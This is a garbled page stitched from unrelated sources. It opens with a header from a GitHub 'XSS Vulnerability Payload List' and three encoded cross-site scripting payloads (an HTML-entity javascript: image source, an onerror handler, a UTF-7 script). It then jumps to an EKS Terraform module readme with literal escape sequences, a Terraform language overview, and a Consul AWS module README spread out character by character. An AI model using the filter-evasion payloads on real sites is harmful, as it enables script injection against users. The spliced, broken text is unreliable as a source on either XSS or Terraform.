<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>


<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-

###  Cross Site Scripting ( XSS ) Vulnerability Payload List 

<img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/license/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/issues/detail/author/payloadbox/xss-payload-list/1">


<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://user-images.githubusercontent.com/25423296/163456776-7f95b81a-f1ed-45f7-b7ab-8fa810d529fa.png">
  <source media="(prefers-color-scheme: light)" srcset="https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png">
  <img alt="Shows an illustrated sun in light mode and a moon with stars in dark mode." src="https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png">
</picture>


LOL<style>*{/all/color/all/:/all/red/all/;/[0]IE,Safari[0]/color:green;color:bl/IE/ue;}</style>


https://www.google.com/

![giphy](https://i.giphy.com/media/5qFQfYUaBhSrbHNtIC/giphy.gif)



An example of harming update was the removal of several commonly used, but deprecated APIs, in Kubernetes 1.16. More information on the API removals, see the Kubernetes blog post.\n\nBy default, this module manages the aws-auth configmap for you (manage_aws_auth=true). To avoid the following issue where the EKS creation is ACTIVE but not ready, we implemented a retry logic with an local-exec provisioner and wget (by default) with failover to curl.\n\nIf you want to manage your aws-auth configmap, ensure you have wget (or curl) and /bin/sh installed where you're running Terraform or set wait_for_cluster_cmd and wait_for_cluster_interpreter to match your needs.\n\nFor windows users, please read the following doc.\n\n## Usage example\n\nA full example leveraging other community modules is contained in the examples/basic directory.\n\nhcl\\ndata \\\"aws_eks_cluster\\\" \\\"cluster\\\" {\\n  name = module.my-cluster.cluster_id\\n}\\n\\ndata \\\"aws_eks_cluster_auth\\\" \\\"cluster\\\" {\\n  name = module.my-cluster.cluster_id\\n}\\n\\nprovider \\\"kubernetes\\\" {\\n  host                   = data.aws_eks_cluster.cluster.endpoint\\n  cluster_ca_certificate = base64decode(data.aws_eks_cluster.cluster.certificate_authority.0.data)\\n  token                  = data.aws_eks_cluster_auth.cluster.token\\n  load_config_file       = false\\n  version                = \\\"~> 1.9\\\"\\n}\\n\\nmodule \\\"my-cluster\\\" {\\n  source          = \\\"terraform-aws-modules/eks/aws\\\"\\n  cluster_name    = \\\"my-cluster\\\"\\n  cluster_version = \\\"1.17\\\"\\n  subnets         = [\\\"subnet-abcde012\\\", \\\"subnet-bcde012a\\\", \\\"subnet-fghi345a\\\"]\\n  vpc_id          = \\\"vpc-1234556abcdef\\\"\\n\\n  worker_groups = [\\n    {\\n      instance_type = \\\"m4.large\\\"\\n      asg_max_size  = 5\\n    }\\n  ]\\n}\\n\n## 

Resources and Modules
The main purpose of the Terraform language is declaring resources. All other language features exist only to make the definition of resources more flexible and convenient.

A group of resources can be gathered into a module, which creates a larger unit of configuration. A resource describes a single infrastructure object, while a module might describe a set of objects and the necessary relationships between them in order to create a higher-level system.

A Terraform configuration consists of a root module, where evaluation begins, along with a tree of child modules created when one module calls another.

 Arguments, Blocks, and Expressions
The syntax of the Terraform language consists of only a few basic elements:

resource "aws_vpc" "main" {
  cidr_block = var.base_cidr_block
}

<BLOCK TYPE> "<BLOCK LABEL>" "<BLOCK LABEL>" {
  # Block body
  <IDENTIFIER> = <EXPRESSION> # Argument
}
Blocks are containers for other content and usually represent the configuration of some kind of object, like a resource. Blocks have a block type, can have zero or more labels, and have a body that contains any number of arguments and nested blocks. Most of Terraform's features are controlled by top-level blocks in a configuration file.
Arguments assign a value to a name. They appear within blocks.
Expressions represent a value, either literally or by referencing and combining other values. They appear as values for arguments, or within other expressions.
For full details about Terraform's syntax, see:

Configuration Syntax
Expressions
 Code Organization
The Terraform language uses configuration files that are named with the .tf file extension. There is also a JSON-based variant of the language that is named with the .tf.json file extension.

Configuration files must always use UTF-8 encoding, and by convention are usually maintained with Unix-style line endings (LF) rather than Windows-style line endings (CRLF), though both are accepted.

A module is a collection of .tf or .tf.json files kept together in a directory. The root module is built from the configuration files in the current working directory when Terraform is run, and this module may reference child modules in other directories, which can in turn reference other modules, etc.

The simplest Terraform configuration is a single root module containing only a single .tf file. A configuration can grow gradually as more resources are added, either by creating new configuration files within the root module or by organizing sets of resources into child modules.

 Configuration Ordering
Because Terraform's configuration language is declarative, the ordering of blocks is generally not significant. (The order of provisioner blocks within a resource is the only major feature where block order matters.)

Terraform automatically processes resources in the correct order based on relationships defined between them in configuration, and so you can organize resources into source files in whatever way makes sense for your infrastructure.

 Terraform CLI vs. Providers
The Terraform command line interface (CLI) is a general engine for evaluating and applying Terraform configurations. It defines the Terraform language syntax and overall structure, and coordinates sequences of changes that must be made to make remote infrastructure match the given configuration.

This general engine has no knowledge about specific types of infrastructure objects. Instead, Terraform uses plugins called providers that each define and manage a set of resource types. Most providers are associated with a particular cloud or on-premises infrastructure service, allowing Terraform to manage infrastructure objects within that service.

Terraform doesn't have a concept of platform-independent resource types   resources are always tied to a provider, since the features of similar resources can vary greatly from provider to provider. But Terraform CLI's shared configuration engine ensures that the same language constructs and syntax are available across all services and allows resource types from different services to be combined as needed.

 Example
The following simple example describes a simple network topology for Amazon Web Services, just to give a sense of the overall structure and syntax of the Terraform language. Similar configurations can be created for other virtual network services, using resource types defined by other providers, and a practical network configuration will often contain additional elements not shown here.

variable "aws_region" {}

variable "base_cidr_block" {
  description = "A /16 CIDR range definition, such as 10.1.0.0/16, that the VPC will use"
  default = "10.1.0.0/16"
}

variable "availability_zones" {
  description = "A list of availability zones in which to create subnets"
  type = list(string)
}

provider "aws" {
  region = var.aws_region
}

resource "aws_vpc" "main" {
  # Referencing the base_cidr_block variable allows the network address
  # to be changed without modifying the configuration.
  cidr_block = var.base_cidr_block
}

resource "aws_subnet" "az" {
  # Create one subnet for each given availability zone.
  count = length(var.availability_zones)

  # For each subnet, use one of the specified availability zones.
  availability_zone = var.availability_zones[count.index]

  # By referencing the aws_vpc.main object, Terraform knows that the subnet
  # must be created only after the VPC is created.
  vpc_id = aws_vpc.main.id

  # Built-in functions and operators can be used for simple transformations of
  # values, such as computing a subnet address. Here we create a /20 prefix for
  # each subnet, using consecutive addresses for each availability zone,
  # such as 10.1.16.0/20 .
  cidr_block = cidrsubnet(aws_vpc.main.cidr_block, 4, count.index+1)
}
[ ! [ M a i n t a i n e d   b y   G r u n t w o r k . i o ] ( h t t p s : / / i m g . s h i e l d s . i o / b a d g e / m a i n t a i n e d % 2 0 b y - g r u n t w o r k . i o - % 2 3 5 8 4 9 a 6 . s v g ) ] ( h t t p s : / / g r u n t w o r k . i o / ? r e f = r e p o _ a w s _ c o n s u l ) 
 #   C o n s u l   A W S   M o d u l e 
 
 T h i s   r e p o   c o n t a i n s   a   s e t   o f   m o d u l e s   i n   t h e   [ m o d u l e s   f o l d e r ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s )   f o r   d e p l o y i n g   a   [ C o n s u l ] ( h t t p s : / / w w w . c o n s u l . i o / )   c l u s t e r   o n   
 [ A W S ] ( h t t p s : / / a w s . a m a z o n . c o m / )   u s i n g   [ T e r r a f o r m ] ( h t t p s : / / w w w . t e r r a f o r m . i o / ) .   C o n s u l   i s   a   d i s t r i b u t e d ,   h i g h l y - a v a i l a b l e   
 t o o l   t h a t   y o u   c a n   u s e   f o r   s e r v i c e   d i s c o v e r y   a n d   k e y / v a l u e   s t o r a g e .   A   C o n s u l   c l u s t e r   t y p i c a l l y   i n c l u d e s   a   s m a l l   n u m b e r 
 o f   s e r v e r   n o d e s ,   w h i c h   a r e   r e s p o n s i b l e   f o r   b e i n g   p a r t   o f   t h e   [ c o n s e n s u s   
 q u o r u m ] ( h t t p s : / / w w w . c o n s u l . i o / d o c s / i n t e r n a l s / c o n s e n s u s . h t m l ) ,   a n d   a   l a r g e r   n u m b e r   o f   c l i e n t   n o d e s ,   w h i c h   y o u   t y p i c a l l y   
 r u n   a l o n g s i d e   y o u r   a p p s : 
 
 ! [ C o n s u l   a r c h i t e c t u r e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / b l o b / m a s t e r / _ d o c s / a r c h i t e c t u r e . p n g ? r a w = t r u e ) 
 
 
 
 # #   H o w   t o   u s e   t h i s   M o d u l e 
 
 T h i s   r e p o   h a s   t h e   f o l l o w i n g   f o l d e r   s t r u c t u r e : 
 
 *   [ m o d u l e s ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s ) :   T h i s   f o l d e r   c o n t a i n s   s e v e r a l   s t a n d a l o n e ,   r e u s a b l e ,   p r o d u c t i o n - g r a d e   m o d u l e s   t h a t   y o u   c a n   u s e   t o   d e p l o y   C o n s u l . 
 *   [ e x a m p l e s ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / e x a m p l e s ) :   T h i s   f o l d e r   s h o w s   e x a m p l e s   o f   d i f f e r e n t   w a y s   t o   c o m b i n e   t h e   m o d u l e s   i n   t h e   ` m o d u l e s `   f o l d e r   t o   d e p l o y   C o n s u l . 
 *   [ t e s t ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / t e s t ) :   A u t o m a t e d   t e s t s   f o r   t h e   m o d u l e s   a n d   e x a m p l e s . 
 *   [ r o o t   f o l d e r ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r ) :   T h e   r o o t   f o l d e r   i s   * a n   e x a m p l e *   o f   h o w   t o   u s e   t h e   [ c o n s u l - c l u s t e r   m o d u l e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / c o n s u l - c l u s t e r )   
     m o d u l e   t o   d e p l o y   a   [ C o n s u l ] ( h t t p s : / / w w w . c o n s u l . i o / )   c l u s t e r   i n   [ A W S ] ( h t t p s : / / a w s . a m a z o n . c o m / ) .   T h e   T e r r a f o r m   R e g i s t r y   r e q u i r e s   t h e   r o o t   o f   e v e r y   r e p o   t o   c o n t a i n   T e r r a f o r m   c o d e ,   s o   w e ' v e   p u t   o n e   o f   t h e   e x a m p l e s   t h e r e .   T h i s   e x a m p l e   i s   g r e a t   f o r   l e a r n i n g   a n d   e x p e r i m e n t i n g ,   b u t   f o r   p r o d u c t i o n   u s e ,   p l e a s e   u s e   t h e   u n d e r l y i n g   m o d u l e s   i n   t h e   [ m o d u l e s   f o l d e r ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s )   d i r e c t l y . 
 
 T o   d e p l o y   C o n s u l   s e r v e r s   f o r   p r o d u c t i o n   u s i n g   t h i s   r e p o : 
 
 1 .   C r e a t e   a   C o n s u l   A M I   u s i n g   a   P a c k e r   t e m p l a t e   t h a t   r e f e r e n c e s   t h e   [ i n s t a l l - c o n s u l   m o d u l e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / i n s t a l l - c o n s u l ) . 
       H e r e   i s   a n   [ e x a m p l e   P a c k e r   t e m p l a t e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / e x a m p l e s / c o n s u l - a m i # q u i c k - s t a r t ) .   
       
       I f   y o u   a r e   j u s t   e x p e r i m e n t i n g   w i t h   t h i s   M o d u l e ,   y o u   m a y   f i n d   i t   m o r e   c o n v e n i e n t   t o   u s e   o n e   o f   o u r   o f f i c i a l   p u b l i c   A M I s . 
       C h e c k   o u t   t h e   ` a w s _ a m i `   d a t a   s o u r c e   u s a g e   i n   ` m a i n . t f `   f o r   h o w   t o   a u t o - d i s c o v e r   t h i s   A M I . 
     
         * * W A R N I N G !   D o   N O T   u s e   t h e s e   A M I s   i n   y o u r   p r o d u c t i o n   s e t u p .   I n   p r o d u c t i o n ,   y o u   s h o u l d   b u i l d   y o u r   o w n   A M I s   i n   y o u r   o w n   
         A W S   a c c o u n t . * * 
       
 1 .   D e p l o y   t h a t   A M I   a c r o s s   a n   A u t o   S c a l i n g   G r o u p   u s i n g   t h e   T e r r a f o r m   [ c o n s u l - c l u s t e r   m o d u l e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / c o n s u l - c l u s t e r )   
       a n d   e x e c u t e   t h e   [ r u n - c o n s u l   s c r i p t ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / r u n - c o n s u l )   w i t h   t h e   ` - - s e r v e r `   f l a g   d u r i n g   b o o t   o n   e a c h   
       I n s t a n c e   i n   t h e   A u t o   S c a l i n g   G r o u p   t o   f o r m   t h e   C o n s u l   c l u s t e r .   H e r e   i s   [ a n   e x a m p l e   T e r r a f o r m   
       c o n f i g u r a t i o n ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / e x a m p l e s / r o o t - e x a m p l e # q u i c k - s t a r t )   t o   p r o v i s i o n   a   C o n s u l   c l u s t e r . 
 
 T o   d e p l o y   C o n s u l   c l i e n t s   f o r   p r o d u c t i o n   u s i n g   t h i s   r e p o : 
   
 1 .   U s e   t h e   [ i n s t a l l - c o n s u l   m o d u l e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / i n s t a l l - c o n s u l )   t o   i n s t a l l   C o n s u l   a l o n g s i d e   y o u r   a p p l i c a t i o n   c o d e . 
 1 .   B e f o r e   b o o t i n g   y o u r   a p p ,   e x e c u t e   t h e   [ r u n - c o n s u l   s c r i p t ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / r u n - c o n s u l )   w i t h   ` - - c l i e n t `   f l a g . 
 1 .   Y o u r   a p p   c a n   n o w   u s e   t h e   l o c a l   C o n s u l   a g e n t   f o r   s e r v i c e   d i s c o v e r y   a n d   k e y / v a l u e   s t o r a g e . 
 1 .   O p t i o n a l l y ,   y o u   c a n   u s e   t h e   [ i n s t a l l - d n s m a s q   m o d u l e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / i n s t a l l - d n s m a s q )   f o r   U b u n t u   1 6 . 0 4   a n d   A m a z o n   L i n u x   2   o r   [ s e t u p - s y s t e m d - r e s o l v e d ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / s e t u p - s y s t e m d - r e s o l v e d )   f o r   U b u n t u   1 8 . 0 4   t o   c o n f i g u r e   C o n s u l   a s   t h e   D N S   f o r   a 
       s p e c i f i c   d o m a i n   ( e . g .   ` . c o n s u l ` )   s o   t h a t   U R L s   s u c h   a s   ` f o o . s e r v i c e . c o n s u l `   r e s o l v e   a u t o m a t i c a l l y   t o   t h e   I P   
       a d d r e s s ( e s )   f o r   a   s e r v i c e   ` f o o `   r e g i s t e r e d   i n   C o n s u l   ( a l l   o t h e r   d o m a i n   n a m e s   w i l l   b e   c o n t i n u e   t o   r e s o l v e   u s i n g   t h e 
       d e f a u l t   r e s o l v e r   o n   t h e   O S ) . 
       
   
 
 
 # #   W h a t ' s   a   M o d u l e ? 
 
 A   M o d u l e   i s   a   c a n o n i c a l ,   r e u s a b l e ,   b e s t - p r a c t i c e s   d e f i n i t i o n   f o r   h o w   t o   r u n   a   s i n g l e   p i e c e   o f   i n f r a s t r u c t u r e ,   s u c h   
 a s   a   d a t a b a s e   o r   s e r v e r   c l u s t e r .   E a c h   M o d u l e   i s   c r e a t e d   u s i n g   [ T e r r a f o r m ] ( h t t p s : / / w w w . t e r r a f o r m . i o / ) ,   a n d 
 i n c l u d e s   a u t o m a t e d   t e s t s ,   e x a m p l e s ,   a n d   d o c u m e n t a t i o n .   I t   i s   m a i n t a i n e d   b o t h   b y   t h e   o p e n   s o u r c e   c o m m u n i t y   a n d   
 c o m p a n i e s   t h a t   p r o v i d e   c o m m e r c i a l   s u p p o r t .   
 
 I n s t e a d   o f   f i g u r i n g   o u t   t h e   d e t a i l s   o f   h o w   t o   r u n   a   p i e c e   o f   i n f r a s t r u c t u r e   f r o m   s c r a t c h ,   y o u   c a n   r e u s e   
 e x i s t i n g   c o d e   t h a t   h a s   b e e n   p r o v e n   i n   p r o d u c t i o n .   A n d   i n s t e a d   o f   m a i n t a i n i n g   a l l   t h a t   i n f r a s t r u c t u r e   c o d e   y o u r s e l f ,   
 y o u   c a n   l e v e r a g e   t h e   w o r k   o f   t h e   M o d u l e   c o m m u n i t y   t o   p i c k   u p   i n f r a s t r u c t u r e   i m p r o v e m e n t s   t h r o u g h 
 a   v e r s i o n   n u m b e r   b u m p . 
   
   
   
 # #   W h o   m a i n t a i n s   t h i s   M o d u l e ? 
 
 T h i s   M o d u l e   i s   m a i n t a i n e d   b y   [ G r u n t w o r k ] ( h t t p : / / w w w . g r u n t w o r k . i o / ) .   I f   y o u ' r e   l o o k i n g   f o r   h e l p   o r   c o m m e r c i a l   
 s u p p o r t ,   s e n d   a n   e m a i l   t o   [ m o d u l e s @ g r u n t w o r k . i o ] ( m a i l t o : m o d u l e s @ g r u n t w o r k . i o ? S u b j e c t = C o n s u l % 2 0 M o d u l e ) .   
 G r u n t w o r k   c a n   h e l p   w i t h : 
 
 *   S e t u p ,   c u s t o m i z a t i o n ,   a n d   s u p p o r t   f o r   t h i s   M o d u l e . 
 *   M o d u l e s   f o r   o t h e r   t y p e s   o f   i n f r a s t r u c t u r e ,   s u c h   a s   V P C s ,   D o c k e r   c l u s t e r s ,   d a t a b a s e s ,   a n d   c o n t i n u o u s   i n t e g r a t i o n . 
 *   M o d u l e s   t h a t   m e e t   c o m p l i a n c e   r e q u i r e m e n t s ,   s u c h   a s   H I P A A . 
 *   C o n s u l t i n g   &   T r a i n i n g   o n   A W S ,   T e r r a f o r m ,   a n d   D e v O p s . 
 
 
 
 # #   C o d e   i n c l u d e d   i n   t h i s   M o d u l e : 
 
 *   [ i n s t a l l - c o n s u l ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / i n s t a l l - c o n s u l ) :   T h i s   m o d u l e   i n s t a l l s   C o n s u l   u s i n g   a 
     [ P a c k e r ] ( h t t p s : / / w w w . p a c k e r . i o / )   t e m p l a t e   t o   c r e a t e   a   C o n s u l   
     [ A m a z o n   M a c h i n e   I m a g e   ( A M I ) ] ( h t t p : / / d o c s . a w s . a m a z o n . c o m / A W S E C 2 / l a t e s t / U s e r G u i d e / A M I s . h t m l ) . 
 
 *   [ c o n s u l - c l u s t e r ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / c o n s u l - c l u s t e r ) :   T h e   m o d u l e   i n c l u d e s   T e r r a f o r m   c o d e   t o   d e p l o y   a   C o n s u l   A M I   a c r o s s   a n   [ A u t o   
     S c a l i n g   G r o u p ] ( h t t p s : / / a w s . a m a z o n . c o m / a u t o s c a l i n g / ) .   
     
 *   [ r u n - c o n s u l ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / r u n - c o n s u l ) :   T h i s   m o d u l e   i n c l u d e s   t h e   s c r i p t s   t o   c o n f i g u r e   a n d   r u n   C o n s u l .   I t   i s   u s e d 
     b y   t h e   a b o v e   P a c k e r   m o d u l e   a t   b u i l d - t i m e   t o   s e t   c o n f i g u r a t i o n s ,   a n d   b y   t h e   T e r r a f o r m   m o d u l e   a t   r u n t i m e   
     w i t h   [ U s e r   D a t a ] ( h t t p : / / d o c s . a w s . a m a z o n . c o m / A W S E C 2 / l a t e s t / U s e r G u i d e / u s e r - d a t a . h t m l # u s e r - d a t a - s h e l l - s c r i p t s ) 
     t o   c r e a t e   t h e   c l u s t e r . 
 
 *   [ i n s t a l l - d n s m a s q   m o d u l e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / i n s t a l l - d n s m a s q ) :   I n s t a l l   [ D n s m a s q ] ( h t t p : / / w w w . t h e k e l l e y s . o r g . u k / d n s m a s q / d o c . h t m l ) 
     f o r   U b u n t u   1 6 . 0 4   a n d   A m a z o n   L i n u x   2   a n d   c o n f i g u r e   i t   t o   f o r w a r d   r e q u e s t s   f o r   a   s p e c i f i c   d o m a i n   t o   C o n s u l .   T h i s   a l l o w s   y o u   t o   u s e   C o n s u l   a s   a   D N S   s e r v e r 
     f o r   U R L s   s u c h   a s   ` f o o . s e r v i c e . c o n s u l ` . 
 
 *   [ s e t u p - s y s t e m d - r e s o l v e d   m o d u l e ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / s e t u p - s y s t e m d - r e s o l v e d ) :   S e t u p   [ s y s t e m d - r e s o l v e d ] ( h t t p s : / / w w w . f r e e d e s k t o p . o r g / s o f t w a r e / s y s t e m d / m a n / r e s o l v e d . c o n f . h t m l ) 
     f o r   u b u n t u   1 8 . 0 4   a n d   c o n f i g u r e   i t   t o   f o r w a r d   r e q u e s t s   f o r   a   s p e c i f i c   d o m a i n   t o   C o n s u l .   T h i s   a l l o w s   y o u   t o   u s e   C o n s u l   a s   a   D N S   s e r v e r 
     f o r   U R L s   s u c h   a s   ` f o o . s e r v i c e . c o n s u l ` . 
 
 *   [ c o n s u l - i a m - p o l i c i e s ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / c o n s u l - i a m - p o l i c i e s ) :   D e f i n e s   t h e   I A M   p o l i c i e s   n e c e s s a r y   f o r   a   C o n s u l   c l u s t e r .   
 
 *   [ c o n s u l - s e c u r i t y - g r o u p - r u l e s ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / c o n s u l - s e c u r i t y - g r o u p - r u l e s ) :   D e f i n e s   t h e   s e c u r i t y   g r o u p   r u l e s   u s e d   b y   a   
     C o n s u l   c l u s t e r   t o   c o n t r o l   t h e   t r a f f i c   t h a t   i s   a l l o w e d   t o   g o   i n   a n d   o u t   o f   t h e   c l u s t e r . 
 
 *   [ c o n s u l - c l i e n t - s e c u r i t y - g r o u p - r u l e s ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / m o d u l e s / c o n s u l - c l i e n t - s e c u r i t y - g r o u p - r u l e s ) :   D e f i n e s   t h e   s e c u r i t y   g r o u p   r u l e s 
     u s e d   b y   a   C o n s u l   a g e n t   t o   c o n t r o l   t h e   t r a f f i c   t h a t   i s   a l l o w e d   t o   g o   i n   a n d   o u t . 
 
 
 
 # #   H o w   d o   I   c o n t r i b u t e   t o   t h i s   M o d u l e ? 
 
 C o n t r i b u t i o n s   a r e   v e r y   w e l c o m e !   C h e c k   o u t   t h e   [ C o n t r i b u t i o n   G u i d e l i n e s ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / C O N T R I B U T I N G . m d )   f o r   i n s t r u c t i o n s . 
 
 
 
 # #   H o w   i s   t h i s   M o d u l e   v e r s i o n e d ? 
 
 T h i s   M o d u l e   f o l l o w s   t h e   p r i n c i p l e s   o f   [ S e m a n t i c   V e r s i o n i n g ] ( h t t p : / / s e m v e r . o r g / ) .   Y o u   c a n   f i n d   e a c h   n e w   r e l e a s e ,   
 a l o n g   w i t h   t h e   c h a n g e l o g ,   i n   t h e   [ R e l e a s e s   P a g e ] ( . . / . . / r e l e a s e s ) .   
 
 D u r i n g   i n i t i a l   d e v e l o p m e n t ,   t h e   m a j o r   v e r s i o n   w i l l   b e   0   ( e . g . ,   ` 0 . x . y ` ) ,   w h i c h   i n d i c a t e s   t h e   c o d e   d o e s   n o t   y e t   h a v e   a   
 s t a b l e   A P I .   O n c e   w e   h i t   ` 1 . 0 . 0 ` ,   w e   w i l l   m a k e   e v e r y   e f f o r t   t o   m a i n t a i n   a   b a c k w a r d s   c o m p a t i b l e   A P I   a n d   u s e   t h e   M A J O R ,   
 M I N O R ,   a n d   P A T C H   v e r s i o n s   o n   e a c h   r e l e a s e   t o   i n d i c a t e   a n y   i n c o m p a t i b i l i t i e s .   
 
 
 
 # #   L i c e n s e 
 
 T h i s   c o d e   i s   r e l e a s e d   u n d e r   t h e   A p a c h e   2 . 0   L i c e n s e .   P l e a s e   s e e   [ L I C E N S E ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / L I C E N S E )   a n d   [ N O T I C E ] ( h t t p s : / / g i t h u b . c o m / h a s h i c o r p / t e r r a f o r m - a w s - c o n s u l / t r e e / m a s t e r / N O T I C E )   f o r   m o r e   
 d e t a i l s . 
 
 C o p y r i g h t   & c o p y ;   2 0 1 7   G r u n t w o r k ,   I n c .
